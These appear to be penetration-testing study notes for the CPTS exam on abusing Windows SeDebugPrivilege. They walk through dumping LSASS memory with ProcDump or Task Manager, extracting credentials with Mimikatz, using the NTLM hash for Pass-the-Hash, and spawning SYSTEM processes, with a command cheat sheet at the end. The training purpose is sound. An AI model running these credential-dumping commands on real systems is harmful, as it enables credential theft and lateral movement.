This section covers **`SeDebugPrivilege`**, one of the most important Windows privileges to recognize during Windows privilege escalation. The key idea is:

> **If your account has `SeDebugPrivilege`, you may be able to access or manipulate processes running with higher privileges, including SYSTEM.**

The source demonstrates two major abuse paths:

1. **Dump LSASS memory → recover credentials/hashes**
    
2. **Abuse a SYSTEM process → launch a SYSTEM child process**
    

---

## 1. What is `SeDebugPrivilege`?

`SeDebugPrivilege` is the Windows **"Debug programs"** user right.

It can be assigned through:

`Computer Settings > Windows Settings > Security Settings`

By default, administrators receive this privilege because it can provide access to sensitive process memory and operating-system structures. Developers may also receive it for debugging purposes.

### Why is it dangerous?

A user **does not necessarily need to be a local administrator** to have this privilege.

For example:

```text
Normal User
    │
    ├── Not Local Administrator
    │
    └── SeDebugPrivilege
            │
            ├── Access sensitive process memory
            ├── Dump LSASS
            └── Potentially obtain credentials
```

This is why privilege enumeration is so important.

---

# 2. Always Check `whoami /priv`

After obtaining a shell, one of the first commands should be:

```cmd
whoami /priv
```

Example:

```text
PRIVILEGES INFORMATION
----------------------

Privilege Name                 Description                    State
=============================  ============================== ========
SeDebugPrivilege               Debug programs                 Disabled
SeChangeNotifyPrivilege        Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege  Increase a process working set Disabled
```

### CPTS takeaway

Don't only ask:

> "Am I Administrator?"

Also ask:

> **"What privileges does my current token have?"**

A non-admin account with a powerful privilege can sometimes provide a direct privilege-escalation path.

---

# 3. Why `SeDebugPrivilege` Is Valuable

The privilege can allow a process to interact with other processes in ways normally restricted.

One particularly interesting target is:

```text
lsass.exe
```

### LSASS

**LSASS = Local Security Authority Subsystem Service**

It is responsible for important Windows authentication/security functions and can contain credential material associated with logged-on users.

The HTB example uses `SeDebugPrivilege` to dump LSASS memory.

---

# 4. Attack Path #1 — Dump LSASS

The basic attack chain is:

```text
Obtain shell
     │
     ▼
whoami /priv
     │
     ▼
SeDebugPrivilege
     │
     ▼
Access LSASS
     │
     ▼
Create LSASS memory dump
     │
     ▼
Process dump with Mimikatz
     │
     ▼
Recover credential material
     │
     ▼
Potential lateral movement
```

![Image](https://images.openai.com/static-rsc-4/rV70y7DUAbPLdla0XJeSEY2K8IdRgL80rSlepXGaGfmnzLA_PR_jOKW46EZK3rqA-DhTyFosirCi4f9hUWAqOHW-x3U6rjzr6K5Dl4VDFAvpWnyZAouOgTcOpsX4xW50zILjucA1zG4fWOekj7QmYn4F2Kj28mHt9caYrOGrQF9VPips5amWFbDeecJ_aCyD?purpose=fullsize)

![Image](https://images.openai.com/static-rsc-4/00wPaa_tgkNzMfU6ocI3cNIV23SxJ8afG_1efjBeoBYDQoT6220Yci3qv5Yatg7Fc2BS4kfgF-MHns_kQVvQ68Nu00pHpKCmc7BiOulhrE0nDdeCBNGhh3cvLn5V_Y4H0dSNOf_LekAA09pu394kofyK1koTmVKXZnhNoZoTwSf_hWlSgnPGmsxyu3bzuMWu?purpose=fullsize)

![Image](https://images.openai.com/static-rsc-4/-thMXU4wYCZszeK7gTbOwjpxeLY8p7ifjQGjape7wjEuROE7vvWYNkspZSvxVaFSlO8qZRyilFpeg4X3-DCAcFWtlMFxCY09t8FRLLzTDpvYITTreGjurgaLR59B_Ah73guxzXQNaxvHEi0cMrxVrkQLnPHrb1T5Jmh0s7Tnm8NQ1vXzuVUEu60mPlYtM0Re?purpose=fullsize)

![Image](https://images.openai.com/static-rsc-4/wZswhoFzyZ3pUODpgCJ6oDThjWS3lH3-ikQ4S52FqNR6SqD7Zc3Wq2PCcFpSLH84zp_kruoHR6Gk6Pbw3UwwvsfspHx2DpTJJZhp7dNBQQi85pmDU2KYH2QUHdojdECqYmgkxZ1dTetVox4eOVxVYO-XTZkq1d1pzfYmOIC7YaA84eV8ezddYGd6MOqSyQ6R?purpose=fullsize)

![Image](https://images.openai.com/static-rsc-4/i_kTWuuFAHBl4f3cAXVsyBGydWyKAaVwlVFEo6vJWuL3u-z67pH9OgLISBikvmJU90TGJHNu8tcmE65d0cxybFKNfqh82zlEZnVh_eF_7zgURUR4Q8AfXUTaBONbpsR81h94p6ZUDopY6wjtMX1fJ6UWe3EjFcTNsIvtR3-X39oJtCO0i91pUiSm0kX8ClCi?purpose=fullsize)

---

## 5. Using ProcDump

The source demonstrates Microsoft's Sysinternals **ProcDump**.

Command:

```cmd
procdump.exe -accepteula -ma lsass.exe lsass.dmp
```

Meaning:

|Option|Meaning|
|---|---|
|`-accepteula`|Automatically accept Sysinternals EULA|
|`-ma`|Create a full process dump|
|`lsass.exe`|Target process|
|`lsass.dmp`|Output dump file|

The example successfully creates an approximately 43 MB LSASS dump.

### Mental model

```text
lsass.exe
   │
   │ memory
   ▼
lsass.dmp
   │
   ▼
credential analysis
```

---

# 6. Analyze the Dump with Mimikatz

The source then loads the dump into Mimikatz.

First:

```text
mimikatz.exe
```

Then:

```text
log
```

This creates:

```text
mimikatz.log
```

The source specifically recommends using `log` before credential-dumping commands so the output is saved to a text file.

Then load the dump:

```text
sekurlsa::minidump lsass.dmp
```

And retrieve logon credential information:

```text
sekurlsa::logonpasswords
```

---

# 7. What Can Appear in the Output?

The example contains a logged-on user:

```text
User Name : jordan
Domain    : WINLPE-SRV01
```

and:

```text
NTLM : cf3a5525ee9414229e66279623ed5c58
```

So the important chain is:

```text
SeDebugPrivilege
       ↓
Access LSASS
       ↓
Dump LSASS
       ↓
Mimikatz
       ↓
Credential material / NTLM hash
       ↓
Potential lateral movement
```

The source notes that if the same local administrator password is reused across multiple systems, a recovered NTLM hash could potentially be used for **Pass-the-Hash** lateral movement.

---

# 8. Alternative: Task Manager

What if you can't transfer ProcDump or other tools?

The source provides another method when you have **RDP access**.

You can manually dump LSASS through:

```text
Task Manager
    ↓
Details
    ↓
lsass.exe
    ↓
Create dump file
```

The resulting dump can then be transferred to the attack system and analyzed with Mimikatz.

### CPTS lesson

Always think about **tool availability**.

```text
Can I upload tools?
       │
   ┌───┴────┐
  YES       NO
   │         │
ProcDump   Task Manager
   │         │
   └────┬────┘
        ▼
   LSASS dump
```

This is exactly why manual enumeration and alternative techniques matter during a pentest.

---

# 9. Attack Path #2 — SYSTEM RCE

`SeDebugPrivilege` isn't only useful for credential dumping.

The source also demonstrates using it to create a process that inherits the security context/token of a privileged parent process.

Conceptually:

```text
Current User
     │
     │ SeDebugPrivilege
     ▼
Target SYSTEM process
     │
     │ manipulate process creation
     ▼
Child process
     │
     ▼
SYSTEM
```

---

# 10. Find a SYSTEM Process

First enumerate processes:

```powershell
tasklist
```

Example:

```text
Image Name       PID
================ ===
System             4
smss.exe         340
csrss.exe        444
wininit.exe      548
csrss.exe        556
winlogon.exe     612
```

The source identifies:

```text
winlogon.exe
PID 612
```

as a process running as SYSTEM.

---

# 11. Parent → Child Process Concept

The important concept here is **process inheritance**.

A process can create a child process.

The HTB example uses a PowerShell PoC based on `CreateProcessFromParent()` to create a process using the context of a privileged parent.

Conceptually:

```text
SYSTEM Process
      │
      │ Create child
      ▼
   cmd.exe
      │
      ▼
SYSTEM privileges
```

The source demonstrates targeting a SYSTEM process such as `winlogon.exe`.

---

# 12. Finding SYSTEM PIDs with PowerShell

Instead of manually searching through `tasklist`, the source notes that PowerShell's:

```powershell
Get-Process
```

can be used to obtain the PID of a known SYSTEM process, such as LSASS, and pass that PID to the PoC.

The important concept isn't memorizing one particular PoC.

It's recognizing:

```text
SeDebugPrivilege
      +
SYSTEM process PID
      +
process manipulation
      =
possible SYSTEM execution
```

---

# 13. Other SeDebugPrivilege PoCs

The source also references other tools/PoCs capable of obtaining a SYSTEM shell when `SeDebugPrivilege` is available.

This is particularly useful when your initial access is something like:

```text
Web shell
Reverse shell
Command injection
RCE
Service account shell
```

rather than an interactive RDP session.

The source specifically recommends considering PoC modifications that return a reverse shell or execute another desired command when you don't have a fully interactive session.

---

# 🧠 SeDebugPrivilege vs SeImpersonatePrivilege

This is **very important for CPTS** because you've just covered `SeImpersonatePrivilege`.

|Privilege|Main concept|Typical abuse path|
|---|---|---|
|`SeImpersonatePrivilege`|Impersonate another security token|Potato-style attacks|
|`SeAssignPrimaryTokenPrivilege`|Assign a primary token to a process|Token/process abuse|
|`SeDebugPrivilege`|Debug/access other processes|LSASS dumping / SYSTEM process abuse|

### Remember it like this:

```text
SeImpersonate
      ↓
"Give me your token"

SeDebug
      ↓
"Let me access/control your process"

SeAssignPrimaryToken
      ↓
"Let me assign this token to a process"
```

---

# 🔥 CPTS Enumeration Workflow

When you land on a Windows machine:

### Step 1 — Identity

```cmd
whoami
```

```cmd
whoami /groups
```

```cmd
whoami /priv
```

### Step 2 — Check privileges

Look especially for:

```text
SeDebugPrivilege
SeImpersonatePrivilege
SeAssignPrimaryTokenPrivilege
SeBackupPrivilege
SeRestorePrivilege
SeTakeOwnershipPrivilege
SeLoadDriverPrivilege
```

### Step 3 — If `SeDebugPrivilege` exists

Think:

```text
Can I access sensitive processes?
        ↓
Can I dump LSASS?
        ↓
Can I recover credential material?
```

Then also:

```text
Can I manipulate a SYSTEM process?
        ↓
Can I create a SYSTEM child process?
        ↓
Can I obtain SYSTEM execution?
```

---

# ⚔️ CPTS Scenario

Imagine you get:

```text
www-data-like web shell
       ↓
Windows service account
       ↓
whoami
       ↓
some-service-account
```

You run:

```cmd
whoami /priv
```

and discover:

```text
SeDebugPrivilege    Disabled
```

Don't immediately abandon the privilege.

The HTB example demonstrates that this privilege being **listed** is significant and can be leveraged for escalation depending on the token/context and technique used.

Then investigate:

```text
Processes
   ↓
SYSTEM processes
   ↓
LSASS
   ↓
Credential dumping
       OR
SYSTEM process manipulation
```

---

# ⚠️ Disabled vs Missing

This distinction is worth remembering.

### Present but Disabled

```text
SeDebugPrivilege    Disabled
```

means the privilege exists in the token but isn't currently enabled.

### Not Present

If `SeDebugPrivilege` isn't listed at all, your current token doesn't have that privilege.

So:

```text
Listed + Disabled
        ≠
Not assigned
```

For CPTS, **always inspect the complete `whoami /priv` output** rather than only looking for `Enabled`.

---

# 📌 Command Cheat Sheet

### Check current user

```cmd
whoami
```

### Check privileges

```cmd
whoami /priv
```

### Enumerate processes

```cmd
tasklist
```

### PowerShell process enumeration

```powershell
Get-Process
```

### Dump LSASS with ProcDump

```cmd
procdump.exe -accepteula -ma lsass.exe lsass.dmp
```

### Start Mimikatz

```cmd
mimikatz.exe
```

### Enable Mimikatz logging

```text
log
```

### Load LSASS dump

```text
sekurlsa::minidump lsass.dmp
```

### Extract logon credentials

```text
sekurlsa::logonpasswords
```

---

# 🧩 The Big Picture

```text
                    WINDOWS HOST
                         │
                  Low-privileged shell
                         │
                         ▼
                  whoami /priv
                         │
                         ▼
               SeDebugPrivilege?
                    /          \
                  NO            YES
                  │              │
             Enumerate       Investigate
             other paths          │
                                  ├──────────────┐
                                  │              │
                                  ▼              ▼
                              LSASS dump    SYSTEM process
                                  │              │
                                  ▼              ▼
                              Mimikatz      Process abuse
                                  │              │
                                  ▼              ▼
                           Credential       SYSTEM shell
                             material
                                  │
                                  ▼
                           Lateral movement
```

## 🏆 CPTS Must-Know

**Memorize these relationships:**

> **`whoami /priv` → `SeDebugPrivilege` → LSASS → credential material**

and:

> **`whoami /priv` → `SeDebugPrivilege` → SYSTEM process → process manipulation → SYSTEM**

Also remember:

- `SeDebugPrivilege` = **Debug programs**
    
- It can expose sensitive process memory.
    
- **LSASS** is a high-value process.
    
- ProcDump can create a memory dump.
    
- Mimikatz can analyze an LSASS dump.
    
- Recovered NTLM material may enable **Pass-the-Hash** where applicable.
    
- `tasklist` helps identify process PIDs.
    
- `Get-Process` can also identify processes/PIDs.
    
- `SeDebugPrivilege` can potentially provide a path to **SYSTEM execution**, not just credential extraction.
    
- Having RDP access provides alternatives such as Task Manager for creating an LSASS dump.
    
- In a restricted shell/web shell/RCE scenario, think about techniques that don't require a fully interactive desktop.
    

### 🧠 One-line memory trick

**SeDebug = "I can debug/control processes I normally shouldn't be able to touch."**